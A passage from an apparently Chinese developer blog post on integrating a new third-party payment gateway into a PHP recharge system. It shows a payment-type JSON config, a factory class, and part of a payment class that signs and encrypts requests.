class="attr">&quot;name&quot;</span>:<span class="string">&quot;网银H5支付&quot;</span>,<span class="attr">&quot;payStr&quot;</span>:<span class="string">&quot;WY_H5&quot;</span>,<span class="attr">&quot;typeStr&quot;</span>:<span class="string">&quot;&quot;</span>,<span class="attr">&quot;payEntrance&quot;</span>:<span class="string">&quot;1,2,3,4&quot;</span>,<span class="attr">&quot;payStatus&quot;</span>:<span class="number">1</span>,<span class="attr">&quot;request_type&quot;</span>:<span class="number">2</span>&#125;,</span><br><span class="line">	        &#123;<span class="attr">&quot;id&quot;</span>: <span class="number">12</span>,<span class="attr">&quot;name&quot;</span>:<span class="string">&quot;网银快捷支付&quot;</span>,<span class="attr">&quot;payStr&quot;</span>:<span class="string">&quot;WY_KJ&quot;</span>,<span class="attr">&quot;typeStr&quot;</span>:<span class="string">&quot;&quot;</span>,<span class="attr">&quot;payEntrance&quot;</span>:<span class="string">&quot;1,2,3,4&quot;</span>,<span class="attr">&quot;payStatus&quot;</span>:<span class="number">1</span>,<span class="attr">&quot;request_type&quot;</span>:<span class="number">2</span>&#125;,</span><br><span class="line">        	&#123;<span class="attr">&quot;id&quot;</span>: <span class="number">13</span>,<span class="attr">&quot;name&quot;</span>:<span class="string">&quot;京东钱包扫码支付&quot;</span>,<span class="attr">&quot;payStr&quot;</span>:<span class="string">&quot;JD&quot;</span>,<span class="attr">&quot;typeStr&quot;</span>:<span class="string">&quot;&quot;</span>,<span class="attr">&quot;payEntrance&quot;</span>:<span class="string">&quot;1,2,3,4&quot;</span>,<span class="attr">&quot;payStatus&quot;</span>:<span class="number">1</span>,<span class="attr">&quot;request_type&quot;</span>:<span class="number">1</span>&#125;,</span><br><span class="line">	        &#123;<span class="attr">&quot;id&quot;</span>: <span class="number">14</span>,<span class="attr">&quot;name&quot;</span>:<span class="string">&quot;京东钱包WAP支付&quot;</span>,<span class="attr">&quot;payStr&quot;</span>:<span class="string">&quot;JD_WAP&quot;</span>,<span class="attr">&quot;typeStr&quot;</span>:<span class="string">&quot;&quot;</span>,<span class="attr">&quot;payEntrance&quot;</span>:<span class="string">&quot;1,2,3,4&quot;</span>,<span class="attr">&quot;payStatus&quot;</span>:<span class="number">1</span>,<span class="attr">&quot;request_type&quot;</span>:<span class="number">2</span>&#125;,</span><br><span class="line">	        &#123;<span class="attr">&quot;id&quot;</span>: <span class="number">15</span>,<span class="attr">&quot;name&quot;</span>:<span class="string">&quot;京东钱包H5支付&quot;</span>,<span class="attr">&quot;payStr&quot;</span>:<span class="string">&quot;JD_H5&quot;</span>,<span class="attr">&quot;typeStr&quot;</span>:<span class="string">&quot;&quot;</span>,<span class="attr">&quot;payEntrance&quot;</span>:<span class="string">&quot;1,2,3,4&quot;</span>,<span class="attr">&quot;payStatus&quot;</span>:<span class="number">1</span>,<span class="attr">&quot;request_type&quot;</span>:<span class="number">2</span>&#125;,</span><br><span class="line">	        &#123;<span class="attr">&quot;id&quot;</span>: <span class="number">16</span>,<span class="attr">&quot;name&quot;</span>:<span class="string">&quot;银联钱包扫码支付&quot;</span>,<span class="attr">&quot;payStr&quot;</span>:<span class="string">&quot;UN&quot;</span>,<span class="attr">&quot;typeStr&quot;</span>:<span class="string">&quot;&quot;</span>,<span class="attr">&quot;payEntrance&quot;</span>:<span class="string">&quot;1,2,3,4&quot;</span>,<span class="attr">&quot;payStatus&quot;</span>:<span class="number">1</span>,<span class="attr">&quot;request_type&quot;</span>:<span class="number">1</span>&#125;,</span><br><span class="line">	        &#123;<span class="attr">&quot;id&quot;</span>: <span class="number">17</span>,<span class="attr">&quot;name&quot;</span>:<span class="string">&quot;银联钱包WAP支付&quot;</span>,<span class="attr">&quot;payStr&quot;</span>:<span class="string">&quot;UN_WAP&quot;</span>,<span class="attr">&quot;typeStr&quot;</span>:<span class="string">&quot;&quot;</span>,<span class="attr">&quot;payEntrance&quot;</span>:<span class="string">&quot;1,2,3,4&quot;</span>,<span class="attr">&quot;payStatus&quot;</span>:<span class="number">1</span>,<span class="attr">&quot;request_type&quot;</span>:<span class="number">2</span>&#125;,</span><br><span class="line">	        &#123;<span class="attr">&quot;id&quot;</span>: <span class="number">18</span>,<span class="attr">&quot;name&quot;</span>:<span class="string">&quot;银联钱包H5支付&quot;</span>,<span class="attr">&quot;payStr&quot;</span>:<span class="string">&quot;UN_H5&quot;</span>,<span class="attr">&quot;typeStr&quot;</span>:<span class="string">&quot;&quot;</span>,<span class="attr">&quot;payEntrance&quot;</span>:<span class="string">&quot;1,2,3,4&quot;</span>,<span class="attr">&quot;payStatus&quot;</span>:<span class="number">1</span>,<span class="attr">&quot;request_type&quot;</span>:<span class="number">2</span>&#125;,</span><br><span class="line">          &#123;<span class="attr">&quot;id&quot;</span>: <span class="number">19</span>,<span class="attr">&quot;name&quot;</span>:<span class="string">&quot;网关支付扫码&quot;</span>,<span class="attr">&quot;payStr&quot;</span>:<span class="string">&quot;gateway&quot;</span>,<span class="attr">&quot;typeStr&quot;</span>:<span class="string">&quot;&quot;</span>,<span class="attr">&quot;payEntrance&quot;</span>:<span class="string">&quot;1,2,3,4&quot;</span>,<span class="attr">&quot;payStatus&quot;</span>:<span class="number">1</span>,<span class="attr">&quot;request_type&quot;</span>:<span class="number">2</span>&#125;,</span><br><span class="line">          &#123;<span class="attr">&quot;id&quot;</span>: <span class="number">20</span>,<span class="attr">&quot;name&quot;</span>:<span class="string">&quot;微信公众账号&quot;</span>,<span class="attr">&quot;payStr&quot;</span>:<span class="string">&quot;weixinjsapi&quot;</span>,<span class="attr">&quot;typeStr&quot;</span>:<span class="string">&quot;&quot;</span>,<span class="attr">&quot;payEntrance&quot;</span>:<span class="string">&quot;1,2,3,4&quot;</span>,<span class="attr">&quot;payStatus&quot;</span>:<span class="number">1</span>,<span class="attr">&quot;request_type&quot;</span>:<span class="number">1</span>&#125;,</span><br><span class="line">          &#123;<span class="attr">&quot;id&quot;</span>: <span class="number">21</span>,<span class="attr">&quot;name&quot;</span>:<span class="string">&quot;支付宝服务窗支付&quot;</span>,<span class="attr">&quot;payStr&quot;</span>:<span class="string">&quot;weixinjsapi&quot;</span>,<span class="attr">&quot;typeStr&quot;</span>:<span class="string">&quot;&quot;</span>,<span class="attr">&quot;payEntrance&quot;</span>:<span class="string">&quot;1,2,3,4&quot;</span>,<span class="attr">&quot;payStatus&quot;</span>:<span class="number">1</span>,<span class="attr">&quot;request_type&quot;</span>:<span class="number">1</span>&#125;,</span><br><span class="line">          &#123;<span class="attr">&quot;id&quot;</span>: <span class="number">22</span>,<span class="attr">&quot;name&quot;</span>:<span class="string">&quot;支付宝app支付&quot;</span>,<span class="attr">&quot;payStr&quot;</span>:<span class="string">&quot;alipayapp&quot;</span>,<span class="attr">&quot;typeStr&quot;</span>:<span class="string">&quot;&quot;</span>,<span class="attr">&quot;payEntrance&quot;</span>:<span class="string">&quot;1,2,3,4&quot;</span>,<span class="attr">&quot;payStatus&quot;</span>:<span class="number">1</span>,<span class="attr">&quot;request_type&quot;</span>:<span class="number">1</span>&#125;,</span><br><span class="line">          &#123;<span class="attr">&quot;id&quot;</span>: <span class="number">23</span>,<span class="attr">&quot;name&quot;</span>:<span class="string">&quot;苏宁扫码支付&quot;</span>,<span class="attr">&quot;payStr&quot;</span>:<span class="string">&quot;suning&quot;</span>,<span class="attr">&quot;typeStr&quot;</span>:<span class="string">&quot;&quot;</span>,<span class="attr">&quot;payEntrance&quot;</span>:<span class="string">&quot;1,2,3,4&quot;</span>,<span class="attr">&quot;payStatus&quot;</span>:<span class="number">1</span>,<span class="attr">&quot;request_type&quot;</span>:<span class="number">1</span>&#125;</span><br><span class="line">	        ],</span><br><span class="line">        <span class="attr">&quot;sort&quot;</span>: <span class="number">0</span></span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="attr">&quot;nid&quot;</span>: <span class="string">&quot;hua_yin_pay&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;华银&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;merchantID&quot;</span>: <span class="string">&quot;&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;merchantPrivateKey&quot;</span>: <span class="string">&quot;&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;merchantPublicKey&quot;</span>: <span class="string">&quot;&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;platformPublicKey&quot;</span>: <span class="string">&quot;&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;payType&quot;</span>: [</span><br><span class="line">        	&#123;<span class="attr">&quot;id&quot;</span>: <span class="number">1</span>,<span class="attr">&quot;name&quot;</span>:<span class="string">&quot;微信扫码支付&quot;</span>,<span class="attr">&quot;payStr&quot;</span>:<span class="string">&quot;weixin_scan&quot;</span>,<span class="attr">&quot;payEntrance&quot;</span>:<span class="string">&quot;1,2,3,4&quot;</span>,<span class="attr">&quot;payStatus&quot;</span>:<span class="number">1</span>,<span class="attr">&quot;request_type&quot;</span>:<span class="number">1</span>&#125;,</span><br><span class="line">        	&#123;<span class="attr">&quot;id&quot;</span>: <span class="number">4</span>,<span class="attr">&quot;name&quot;</span>:<span class="string">&quot;支付宝扫码支付&quot;</span>,<span class="attr">&quot;payStr&quot;</span>:<span class="string">&quot;alipay_scan&quot;</span>,<span class="attr">&quot;payEntrance&quot;</span>:<span class="string">&quot;1,2,3,4&quot;</span>,<span class="attr">&quot;payStatus&quot;</span>:<span class="number">1</span>,<span class="attr">&quot;request_type&quot;</span>:<span class="number">1</span>&#125;,</span><br><span class="line">        	&#123;<span class="attr">&quot;id&quot;</span>: <span class="number">7</span>,<span class="attr">&quot;name&quot;</span>:<span class="string">&quot;QQ钱包宝扫码支付&quot;</span>,<span class="attr">&quot;payStr&quot;</span>:<span class="string">&quot;tenpay_scan&quot;</span>,<span class="attr">&quot;payEntrance&quot;</span>:<span class="string">&quot;1,2,3,4&quot;</span>,<span class="attr">&quot;payStatus&quot;</span>:<span class="number">1</span>,<span class="attr">&quot;request_type&quot;</span>:<span class="number">1</span>&#125;,</span><br><span class="line">        	&#123;<span class="attr">&quot;id&quot;</span>: <span class="number">10</span>,<span class="attr">&quot;name&quot;</span>:<span class="string">&quot;网银支付&quot;</span>,<span class="attr">&quot;payStr&quot;</span>:<span class="string">&quot;direct_pay&quot;</span>,<span class="attr">&quot;payEntrance&quot;</span>:<span class="string">&quot;1,2,3,4&quot;</span>,<span class="attr">&quot;payStatus&quot;</span>:<span class="number">1</span>,<span class="attr">&quot;request_type&quot;</span>:<span class="number">2</span>&#125;</span><br><span class="line">        ]</span><br><span class="line">    &#125;,</span><br><span class="line">]</span><br></pre></td></tr></table></figure>

<p>思路已经清晰了，直接从文件中添加了一个新的支付配置，果然后台支付列表中出现了，添加上该支付的配置参数</p>
<ul>
<li>添加后，发起支付，报无此支付方式的错误，直接在代码中搜索这个错误信息，找到这个<code>PayFactory.php</code>工厂类，部分代码如下</li>
</ul>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Created by Kevin.</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> kevin</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@copyright</span> HCHT 2017/9/15 17:06</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@description</span> 支付工厂类</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line">include_cache(S_CORE . <span class="string">&#x27;class&#x27;</span> . DS . <span class="string">&#x27;pay&#x27;</span>  . DS . <span class="string">&#x27;chengyi.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">PayFactory</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getInterface</span>(<span class="params"><span class="variable">$payMent</span></span>)</span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">        <span class="keyword">switch</span> (<span class="variable">$payMent</span>) &#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;cheng_yi_pay&#x27;</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">new</span> cheng_yi_pay();</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">                ErrorCode::errorResponse(<span class="number">200015</span>, <span class="string">&#x27;线上支付方式不存在&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>思路已经很明朗了，创建一个支付类，添加上case分支</p>
<ul>
<li>随便打开一个支付类，根据它的部分逻辑，接入新的支付逻辑，处理异步回调时，发现有两个回调可供选择，一个在<code>recharge.php</code>中，一个在根目录下的<code>rechargeNotify.php</code>中，同步回调在根目录下<code>beeePayOk.php</code>，具体可阅读代码，没有必要张贴</li>
</ul>
<h3 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h3><p>具体的支付类代码，仅供参考，每个支付的具体实现都有差别</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@description</span> 诚意支付</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line">include_cache(S_CORE . <span class="string">&#x27;class&#x27;</span> . DS . <span class="string">&#x27;pay&#x27;</span> . DS . <span class="string">&#x27;payinfo&#x27;</span> . <span class="string">&#x27;.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ChengYiPay</span> <span class="keyword">extends</span> <span class="title">PayInfo</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="comment">//请求接口Url</span></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$url</span>      = <span class="string">&#x27;https://pay.chenyipay.com/api/pay/v2&#x27;</span>;</span><br><span class="line">    <span class="comment">//接口名称</span></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$payName</span>  = <span class="string">&#x27;诚意支付&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//获取支付返回数据格式</span></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$retArr</span> = [               <span class="comment">//支付信息返回格式</span></span><br><span class="line">            <span class="string">&#x27;code&#x27;</span> =&gt; <span class="number">1</span>,             <span class="comment">//0:数据获取成功，其他数字，数据获取失败</span></span><br><span class="line">            <span class="string">&#x27;msg&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,             <span class="comment">//返回的提示信息</span></span><br><span class="line">            <span class="string">&#x27;data&#x27;</span> =&gt; []             <span class="comment">//返回数据</span></span><br><span class="line">        ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">//回调处理返回数据格式</span></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$orderInfo</span> = [            <span class="comment">//异步验签结果返回格式</span></span><br><span class="line">        <span class="string">&#x27;code&#x27;</span> =&gt; <span class="number">0</span>,                 <span class="comment">//0：数据获取成功，其他数字，数据获取失败</span></span><br><span class="line">        <span class="string">&#x27;bank_num&#x27;</span> =&gt; <span class="number">219050</span>,        <span class="comment">//银行区分号（不同支付的前三位不同）</span></span><br><span class="line">        <span class="string">&#x27;order_no&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,            <span class="comment">//后台数据库支付订单号</span></span><br><span class="line">        <span class="string">&#x27;amount&#x27;</span> =&gt; <span class="number">0</span>,               <span class="comment">//支付金额</span></span><br><span class="line">        <span class="string">&#x27;ret_error&#x27;</span> =&gt; <span class="number">0</span>,            <span class="comment">//回调处理失败时，返回接口字符串</span></span><br><span class="line">        <span class="string">&#x27;ret_success&#x27;</span> =&gt; <span class="string">&#x27;ok&#x27;</span>,        <span class="comment">//回调处理成功时，返回接口字符串</span></span><br><span class="line">        <span class="string">&#x27;bank_name&#x27;</span> =&gt; <span class="string">&#x27;诚意支付&#x27;</span>,     <span class="comment">//支付方式名称</span></span><br><span class="line">        <span class="string">&#x27;serial_no&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>            <span class="comment">//第三方回调返回的第三方支付订单号（支付流水号）</span></span><br><span class="line">    ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 构成函数</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="built_in">parent</span>::__construct();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 调用第三方支付接口，获取支付信息</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> array $data 前端返回信息，payment_id，支付类型ID，config，支付类型配置信息</span></span><br><span class="line"><span class="comment">     * &#123;<span class="doctag">@inheritDoc</span>&#125;</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@see</span> PayInfo::doPay()</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> $this-&gt;$retArr;</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">doPay</span>(<span class="params"><span class="variable">$data</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">//生成订单</span></span><br><span class="line">        <span class="variable">$orderInfo</span> = <span class="keyword">$this</span>-&gt;makeOrder(<span class="variable">$data</span>);</span><br><span class="line">        <span class="keyword">if</span> (!<span class="variable">$orderInfo</span>) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;retArr[<span class="string">&#x27;code&#x27;</span>] = <span class="number">219000</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;retArr[<span class="string">&#x27;msg&#x27;</span>]  = <span class="string">&#x27;支付订单生成失败&#x27;</span>;</span><br><span class="line">            payLog(<span class="string">&#x27;payerror.log&#x27;</span>, <span class="string">&#x27;（&#x27;</span> . <span class="keyword">$this</span>-&gt;retArr[<span class="string">&#x27;code&#x27;</span>] . <span class="string">&#x27;）&#x27;</span> . <span class="keyword">$this</span>-&gt;payName . <span class="string">&#x27;订单生成失败，&#x27;</span> . print_r(<span class="variable">$data</span>, <span class="literal">true</span>));</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;retArr;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//获取配置支付信息</span></span><br><span class="line">        <span class="variable">$config</span>      = unserialize(<span class="variable">$data</span>[<span class="string">&#x27;config&#x27;</span>]);</span><br><span class="line">        <span class="variable">$callbackurl</span> = <span class="variable">$config</span>[<span class="string">&#x27;callbackurl&#x27;</span>]?<span class="variable">$config</span>[<span class="string">&#x27;callbackurl&#x27;</span>]:<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_HOST&#x27;</span>];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="variable">$data</span>[<span class="string">&#x27;pay_type&#x27;</span>]) || <span class="keyword">empty</span>(<span class="variable">$config</span>[<span class="string">&#x27;payType&#x27;</span>][<span class="variable">$data</span>[<span class="string">&#x27;pay_type&#x27;</span>]])) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;retArr[<span class="string">&#x27;code&#x27;</span>] = <span class="number">219001</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;retArr[<span class="string">&#x27;msg&#x27;</span>]  = <span class="string">&#x27;支付银行类型不存在&#x27;</span>;</span><br><span class="line">            payLog(<span class="string">&#x27;payerror.log&#x27;</span>, <span class="string">&#x27;（&#x27;</span> . <span class="keyword">$this</span>-&gt;retArr[<span class="string">&#x27;code&#x27;</span>] . <span class="string">&#x27;）&#x27;</span> . <span class="keyword">$this</span>-&gt;payName . <span class="string">&#x27;银行类型不存在，&#x27;</span> . print_r(<span class="variable">$data</span>, <span class="literal">true</span>));</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;retArr;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$postData</span> = [</span><br><span class="line">            <span class="string">&#x27;p1_mchtid&#x27;</span>   =&gt; <span class="variable">$config</span>[<span class="string">&#x27;merchantID&#x27;</span>],</span><br><span class="line">            <span class="string">&#x27;p2_paytype&#x27;</span>  =&gt; <span class="variable">$config</span>[<span class="string">&#x27;payType&#x27;</span>][<span class="variable">$data</span>[<span class="string">&#x27;pay_type&#x27;</span>]][<span class="string">&#x27;payStr&#x27;</span>],</span><br><span class="line">            <span class="string">&#x27;p3_paymoney&#x27;</span> =&gt; <span class="variable">$data</span>[<span class="string">&#x27;money&#x27;</span>],</span><br><span class="line">            <span class="string">&#x27;p4_orderno&#x27;</span>  =&gt; <span class="variable">$orderInfo</span>,</span><br><span class="line">            <span class="comment">//异步</span></span><br><span class="line">            <span class="string">&#x27;p5_callbackurl&#x27;</span> =&gt; <span class="string">&quot;http://&quot;</span>.<span class="variable">$callbackurl</span>.<span class="string">&quot;/?m=api&amp;c=recharge&amp;a=rechargeNotify&amp;payment_id=&quot;</span> . <span class="variable">$data</span>[<span class="string">&#x27;payment_id&#x27;</span>],</span><br><span class="line">            <span class="comment">//同步</span></span><br><span class="line">            <span class="string">&#x27;p6_notifyurl&#x27;</span> =&gt; <span class="string">&quot;http://&quot;</span>.<span class="variable">$callbackurl</span>.<span class="string">&quot;/beeePayOk.php&quot;</span>,</span><br><span class="line">            <span class="string">&#x27;p7_version&#x27;</span>   =&gt; <span class="string">&#x27;v2.9&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;p8_signtype&#x27;</span>  =&gt; <span class="string">&#x27;2&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;p9_attach&#x27;</span>    =&gt; <span class="string">&#x27;chengyi_&#x27;</span> . <span class="variable">$data</span>[<span class="string">&#x27;payment_id&#x27;</span>],</span><br><span class="line">            <span class="string">&#x27;p10_appname&#x27;</span>  =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;p11_isshow&#x27;</span>   =&gt; <span class="string">&#x27;0&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;p12_orderip&#x27;</span>  =&gt; ip(),</span><br><span class="line">            <span class="string">&#x27;p13_memberid&#x27;</span> =&gt; <span class="variable">$data</span>[<span class="string">&#x27;user_id&#x27;</span>],</span><br><span class="line">        ];</span><br><span class="line"></span><br><span class="line">        payLog(<span class="string">&#x27;chengyi.txt&#x27;</span>,print_r(<span class="variable">$postData</span>,<span class="literal">true</span>));</span><br><span class="line"></span><br><span class="line">        <span class="comment">//待签名字符串</span></span><br><span class="line">        <span class="variable">$signStr</span>   = <span class="keyword">$this</span>-&gt;get_sign(<span class="variable">$postData</span>);</span><br><span class="line">        <span class="comment">//生成签名</span></span><br><span class="line">        <span class="variable">$postData</span>[<span class="string">&quot;sign&quot;</span>] = md5(<span class="variable">$signStr</span>.<span class="variable">$config</span>[<span class="string">&#x27;merchantKey&#x27;</span>]);</span><br><span class="line">        <span class="comment">//转为json字符串</span></span><br><span class="line">        <span class="variable">$jsonStr</span>   = json_encode(<span class="variable">$postData</span>);</span><br><span class="line">        <span class="comment">//获取公钥</span></span><br><span class="line">        <span class="variable">$publicKey</span> = <span class="keyword">$this</span>-&gt;publicKeyStr(<span class="variable">$config</span>[<span class="string">&#x27;merchantPublicKey&#x27;</span>]);</span><br><span class="line">        <span class="comment">//公钥加密</span></span><br><span class="line">        <span class="variable">$reqdata</span>   = urlencode(<span class="keyword">$this</span>-&gt;publicEncrypt(<span class="variable">$publicKey</span>, <span class="variable">$jsonStr</span>));</span><br><span class="line">        <span class="comment">//请求参数</span></span><br><span class="line">        <span class="variable">$signData</span>[<span class="string">&quot;mchtid&quot;</span>]  = <span class="variable">$config</span>[<span class="string">&#x27;merchantID&#x27;</span>];</span><br><span class="line">        <span class="variable">$signData</span>[<span class="string">&quot;reqdata&quot;</span>] = <span class="variable">$reqdata</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//判断支付网关是否是wap</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$config</span>[<span class="string">&#x27;payType&#x27;</span>][<span class="variable">$data</span>[<span class="string">&#x27;pay_type&#x27;</span>]][<span class="string">&#x27;request_type&#x27;</span>] == <span class="number">2</span>) &#123;</span><br><span class="line">            <span class="variable">$retData</span> =  [</span><br><span class="line">                <span class="string">&#x27;type&#x27;</span>  =&gt; <span class="variable">$config</span>[<span class="string">&#x27;payType&#x27;</span>][<span class="variable">$data</span>[<span class="string">&#x27;pay_type&#x27;</span>]][<span class="string">&#x27;request_type&#x27;</span>],</span><br><span class="line">                <span class="string">&#x27;modes&#x27;</span> =&gt; <span class="variable">$data</span>[<span class="string">&#x27;pay_model&#x27;</span>],</span><br><span class="line">                <span class="string">&#x27;html&#x27;</span>  =&gt; <span class="keyword">$this</span>-&gt;paramToHtmlForm(<span class="keyword">$this</span>-&gt;url, <span class="variable">$signData</span>)</span><br><span class="line">            ];</span><br><span class="line"></span><br><span class="line">            <span class="keyword">$this</span>-&gt;retArr[<span class="string">&#x27;code&#x27;</span>] = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;retArr[<span class="string">&#x27;data&#x27;</span>]  = <span class="variable">$retData</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;retArr;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//发起请求</span></span><br><span class="line">        <span class="variable">$result</span> = <span class="keyword">$this</span>-&gt;httpRequest(<span class="keyword">$this</span>-&gt;url, json_encode(<span class="variable">$signData</span>));</span><br><span class="line">        <span class="comment">//将json字符串转为数组</span></span><br><span class="line">        <span class="variable">$resultArr</span> = json_decode(<span class="variable">$result</span>,<span class="literal">true</span>);</span><br><span class="line">        <span class="comment">//判断返回信息</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$resultArr</span>[<span class="string">&#x27;rspCode&#x27;</span>] != <span class="number">1</span> &amp;&amp; !<span class="variable">$resultArr</span>[<span class="string">&#x27;data&#x27;</span>]) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;retArr[<span class="string">&#x27;code&#x27;</span>] = <span class="number">219002</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;retArr[<span class="string">&#x27;msg&#x27;</span>]  = <span class="string">&#x27;支付二维码生成失败！&#x27;</span>;</span><br><span class="line">            payLog(<span class="string">&#x27;payerror.log&#x27;</span>, <span class="string">&#x27;（&#x27;</span> . <span class="keyword">$this</span>-&gt;retArr[<span class="string">&#x27;code&#x27;</span>] . <span class="string">&#x27;）&#x27;</span> . <span class="keyword">$this</span>-&gt;payName . <span class="variable">$resultArr</span>[<span class="string">&quot;rspMsg&quot;</span>] . print_r(<span class="variable">$resultArr</span>, <span class="literal">true</span>));</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;retArr;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$resultData</span> = <span class="variable">$resultArr</span>[<span class="string">&#x27;data&#x27;</span>];</span><br><span class="line">        <span class="comment">//验签</span></span><br><span class="line">        <span class="variable">$re</span> = <span class="keyword">$this</span>-&gt;payVerify(<span class="variable">$resultData</span>, <span class="variable">$config</span>[<span class="string">&#x27;merchantKey&#x27;</span>]);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!<span class="variable">$re</span>) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;retArr[<span class="string">&#x27;code&#x27;</span>] = <span class="number">219003</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;retArr[<span class="string">&#x27;msg&#x27;</span>]  = <span class="string">&#x27;支付二维码生成失败！&#x27;</span>;</span><br><span class="line"></span><br><span class="line">            payLog(<span class="string">&#x27;payerror.log&#x27;</span>, <span class="string">&#x27;（&#x27;</span> . <span class="keyword">$this</span>-&gt;retArr[<span class="string">&#x27;code&#x27;</span>] . <span class="string">&#x27;）&#x27;</span> . <span class="keyword">$this</span>-&gt;payName . <span class="string">&#x27;验签失败&#x27;</span> . print_r(<span class="variable">$resultArr</span>, <span class="literal">true</span>));</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;retArr;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        payLog(<span class="string">&#x27;chengyi.txt&#x27;</span>,print_r(<span class="variable">$resultData</span>, <span class="literal">true</span>). <span class="string">&quot;===134&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="variable">$retOderNo</span>           = <span class="variable">$orderInfo</span>;</span><br><span class="line">        <span class="variable">$retOderPayNo</span>        = <span class="keyword">isset</span>(<span class="variable">$resultData</span>[<span class="string">&#x27;r2_systemorderno&#x27;</span>]) ? <span class="variable">$resultData</span>[<span class="string">&#x27;r2_systemorderno&#x27;</span>] : <span class="string">&#x27;chengyipay&#x27;</span> . date(<span class="string">&#x27;YmdHis&#x27;</span>);</span><br><span class="line">        <span class="variable">$retOderPayQrcodrUrl</span> = <span class="keyword">isset</span>(<span class="variable">$resultData</span>[<span class="string">&#x27;r6_qrcode&#x27;</span>]) ? <span 